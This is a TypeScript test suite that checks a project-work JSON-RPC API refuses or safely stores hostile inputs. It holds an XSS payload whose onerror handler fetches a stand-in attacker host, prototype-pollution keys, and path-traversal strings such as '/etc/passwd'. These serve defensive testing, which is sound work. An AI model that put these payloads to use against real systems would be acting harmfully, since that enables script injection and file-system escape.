/**
 * Hostile payloads at the method door (M21-T22, threat model §1, §3, §6).
 *
 * Every case here is a request a model or a compromised client can really
 * make: it goes through `Router.handle` with a JSON-RPC envelope, so the
 * strict schemas, the policy table, the actor the boundary proved and the
 * authority's own ceilings all run exactly as they do in the product.
 *
 * What each case asserts is the same pair: the call is refused (or stored as
 * inert text, where storing it is the right answer), and **nothing was
 * written** — the project holds what it held before.
 */
import { afterEach, describe, expect, it } from "vitest";
import { existsSync } from "node:fs";
import { join } from "node:path";
import {
  ErrorCodes,
  PROJECT_WORK_BODY_MAX_BYTES,
  type ProjectWorkBody,
  type ProjectWorkGetResult,
  type ProjectWorkWriteResult,
} from "@lasercode/protocol";
import { failed, ok, projectWorkHarness, type ProjectWorkHarness } from "./harness.js";
import { specBody } from "./fixtures.js";

let h: ProjectWorkHarness;

afterEach(() => {
  h?.cleanup();
});

function count(harness: ProjectWorkHarness): number {
  return harness.store.list({ projectId: harness.projectId }).counts.total;
}

/** A design body whose props alone carry `entries` × 4 KB of text. */
function bulkyDesignBody(entries: number): ProjectWorkBody {
  const props: Record<string, { type: "text"; value: string }> = {};
  for (let i = 0; i < entries; i++) props[`p${String(i)}`] = { type: "text", value: "x".repeat(4000) };
  return {
    kind: "design",
    design: {
      brief: "A design that is mostly padding.",
      screens: [
        {
          id: "s1",
          name: "Padding",
          content: { tree: { rootNodeId: "n1", nodes: [{ id: "n1", component: { primitive: "stack" }, fidelity: "mapped", props, children: [] }] } },
          states: [],
          fidelity: "mapped",
        },
      ],
      flows: [],
      sketches: [],
      fidelity: "mapped",
      fixtures: [],
    },
  };
}

describe("bodies that are too big", () => {
  it("refuses a body past the documented ceiling, and stores nothing", async () => {
    h = projectWorkHarness();
    const before = count(h);
    const error = failed(
      await h.call("project/work/create", {
        projectId: h.projectId,
        kind: "design",
        title: "Padding",
        // Comfortably past the 4 MB ceiling the protocol documents.
        body: bulkyDesignBody(1400),
        idempotencyKey: "big-1",
      }),
    );
    expect(error.code).toBe(ErrorCodes.InvalidParams);
    expect(error.message).toMatch(/too large|larger than/i);
    expect(count(h)).toBe(before);
  });

  it("still takes a body under the ceiling", async () => {
    h = projectWorkHarness();
    const result = ok<ProjectWorkWriteResult>(
      await h.call("project/work/create", {
        projectId: h.projectId,
        kind: "design",
        title: "Small enough",
        body: bulkyDesignBody(100),
        idempotencyKey: "small-1",
      }),
    );
    expect(result.entity.key).toMatch(/^DES-/);
    expect(JSON.stringify(bulkyDesignBody(100)).length).toBeLessThan(PROJECT_WORK_BODY_MAX_BYTES);
  });

  it("refuses an oversized comment without writing it", async () => {
    h = projectWorkHarness();
    const spec = ok<ProjectWorkWriteResult>(
      await h.call("project/work/create", { projectId: h.projectId, kind: "spec", title: "Phone review", body: specBody(), idempotencyKey: "c1" }),
    );
    // Inside the per-field ceiling, past the per-method one.
    const error = failed(
      await h.call("project/work/comment", {
        projectId: h.projectId,
        entityId: spec.entity.entityId,
        expectedRevisionId: spec.entity.currentRevisionId,
        revisionId: spec.entity.currentRevisionId,
        anchor: { target: "entity" },
        text: "y".repeat(90_000),
        idempotencyKey: "cm-1",
      }),
    );
    expect(error.code).toBe(ErrorCodes.InvalidParams);
    const detail = ok<ProjectWorkGetResult>(await h.call("project/work/get", { projectId: h.projectId, entityId: spec.entity.entityId }));
    expect(detail.comments ?? []).toHaveLength(0);
  });
});

describe("shapes a parser must not be talked into", () => {
  it("refuses a deeply nested body and keeps answering afterwards", async () => {
    h = projectWorkHarness();
    let nested: unknown = "deep";
    for (let i = 0; i < 2000; i++) nested = [nested];
    const error = failed(
      await h.call("project/work/create", {
        projectId: h.projectId,
        kind: "spec",
        title: "Nested",
        body: { kind: "spec", spec: nested },
        idempotencyKey: "deep-1",
      }),
    );
    expect(error.code).toBe(ErrorCodes.InvalidParams);
    expect(count(h)).toBe(0);
    // The host is still here.
    const spec = ok<ProjectWorkWriteResult>(
      await h.call("project/work/create", { projectId: h.projectId, kind: "spec", title: "After", body: specBody(), idempotencyKey: "after-1" }),
    );
    expect(spec.entity.key).toMatch(/^SPEC-/);
  });

  it("never lets a prototype-shaped key reach a prototype", async () => {
    h = projectWorkHarness();
    const props = {
      __proto__: { type: "text", value: "polluted" },
      constructor: { type: "text", value: "polluted" },
      prototype: { type: "text", value: "polluted" },
      ok: { type: "text", value: "kept" },
    } as unknown as Record<string, { type: "text"; value: string }>;
    const body: ProjectWorkBody = {
      kind: "design",
      design: {
        brief: "Prototype keys.",
        screens: [
          {
            id: "s1",
            name: "Keys",
            content: { tree: { rootNodeId: "n1", nodes: [{ id: "n1", component: { primitive: "stack" }, fidelity: "mapped", props, children: [] }] } },
            states: [],
            fidelity: "mapped",
          },
        ],
        flows: [],
        sketches: [],
        fidelity: "mapped",
        fixtures: [],
      },
    };
    const response = await h.call("project/work/create", {
      projectId: h.projectId,
      kind: "design",
      title: "Keys",
      body,
      idempotencyKey: "proto-1",
    });
    // Whether it is refused or stored, no prototype anywhere may have moved.
    expect(({} as Record<string, unknown>)["type"]).toBeUndefined();
    expect(Object.getPrototypeOf({})).toBe(Object.prototype);
    expect(({} as Record<string, unknown>)["value"]).toBeUndefined();
    if (!response.error) {
      const written = response.result as ProjectWorkWriteResult;
      const detail = ok<ProjectWorkGetResult>(
        await h.call("project/work/get", { projectId: h.projectId, entityId: written.entity.entityId, body: { mode: "full" } }),
      );
      const stored = detail.body?.body;
      expect(stored?.kind).toBe("design");
      if (stored?.kind === "design") {
        const node = stored.design.screens[0]!.content.tree!.nodes[0]!;
        expect(Object.getPrototypeOf(node.props)).toBe(Object.prototype);
        expect(node.props["ok"]).toEqual({ type: "text", value: "kept" });
        // A key that cannot be carried is not carried: never a silent prototype.
        expect(Object.prototype.hasOwnProperty.call(node.props, "__proto__") || node.props["__proto__"] === undefined).toBe(true);
      }
    }
  });

  it("stores text with NUL and a lone surrogate as a fixed point, never as drifting bytes", async () => {
    h = projectWorkHarness();
    const hostile = "before\u0000after\uD800end";
    const response = await h.call("project/work/create", {
      projectId: h.projectId,
      kind: "spec",
      title: `Odd ${hostile}`,
      body: specBody(`brief ${hostile}`),
      idempotencyKey: "utf8-1",
    });
    if (response.error) {
      expect(response.error.code).toBe(ErrorCodes.InvalidParams);
      expect(count(h)).toBe(0);
      return;
    }
    const written = response.result as ProjectWorkWriteResult;
    const detail = ok<ProjectWorkGetResult>(
      await h.call("project/work/get", { projectId: h.projectId, entityId: written.entity.entityId, body: { mode: "full" } }),
    );
    // A NUL survives; a lone surrogate cannot be stored as UTF-8 and comes
    // back as the replacement character. Both are text, neither is a crash,
    // and neither truncates what follows it.
    expect(detail.entity.title).toContain("\u0000");
    expect(detail.entity.title.endsWith("end")).toBe(true);
    expect(detail.entity.title).not.toContain("\uD800");
    const stored = detail.body?.body;
    expect(stored?.kind).toBe("spec");
    if (stored?.kind !== "spec") throw new Error("a spec was stored");
    expect(stored.spec.brief.endsWith("end")).toBe(true);
    // And what came back is a fixed point: saving it again digests the same,
    // so no reader ever sees a digest that does not describe the stored bytes.
    const again = ok<ProjectWorkWriteResult>(
      await h.call("project/work/create", {
        projectId: h.projectId,
        kind: "spec",
        title: detail.entity.title,
        body: stored,
        idempotencyKey: "utf8-2",
      }),
    );
    expect(again.entity.currentDigest).toBe(detail.entity.currentDigest);
  });

  it("stores script-bearing text as text and hands it back unchanged", async () => {
    h = projectWorkHarness();
    const payload = '<script>alert(1)</script><img src=x onerror="fetch(\'https://evil.example\')">';
    const written = ok<ProjectWorkWriteResult>(
      await h.call("project/work/create", {
        projectId: h.projectId,
        kind: "spec",
        title: `Markup ${payload}`,
        body: specBody(payload),
        idempotencyKey: "markup-1",
      }),
    );
    const detail = ok<ProjectWorkGetResult>(
      await h.call("project/work/get", { projectId: h.projectId, entityId: written.entity.entityId, body: { mode: "full" } }),
    );
    const stored = detail.body?.body;
    expect(stored?.kind).toBe("spec");
    if (stored?.kind === "spec") expect(stored.spec.brief).toBe(payload);
    // Search answers with the same value text; nothing anywhere interprets it.
    const hits = ok<{ results: Array<{ key: string }> }>(await h.call("project/work/search", { projectId: h.projectId, query: "alert" }));
    expect(hits.results.map((row) => row.key)).toContain(written.entity.key);
  });
});

describe("paths that try to leave the project", () => {
  const traversals = ["../escape", "..", "a/../../escape", "/etc/passwd", "\\\\server\\share", "C:\\Windows\\Temp"];

  it("refuses every traversal an export could be asked for", async () => {
    h = projectWorkHarness();
    for (const path of traversals) {
      const preview = failed(await h.call("project/work/export/preview", { projectId: h.projectId, path }));
      expect(preview.code).toBe(ErrorCodes.InvalidParams);
      const apply = failed(
        await h.call("project/work/export/apply", {
          projectId: h.projectId,
          path,
          previewDigest: "0".repeat(64),
          confirm: true,
          idempotencyKey: `x-${path}`,
        }),
      );
      expect(apply.code).toBe(ErrorCodes.InvalidParams);
    }
    // Nothing was created anywhere near the project root.
    expect(existsSync(join(h.projectRoot, "..", "escape"))).toBe(false);
    expect(existsSync(join(h.projectRoot, "escape"))).toBe(false);
  });

  it("refuses every traversal an import or a publication could be asked for", async () => {
    h = projectWorkHarness();
    for (const path of traversals) {
      expect(failed(await h.call("project/work/import/preview", { projectId: h.projectId, adapter: "markdown", path })).code).toBe(ErrorCodes.InvalidParams);
      expect(failed(await h.call("project/work/publish/preview", { projectId: h.projectId, path })).code).toBe(ErrorCodes.InvalidParams);
      expect(
        failed(
          await h.call("project/work/publish/apply", {
            projectId: h.projectId,
            path,
            previewDigest: "0".repeat(64),
            confirm: true,
            commit: "HEAD",
            idempotencyKey: `p-${path}`,
          }),
        ).code,
      ).toBe(ErrorCodes.InvalidParams);
    }
  });
});
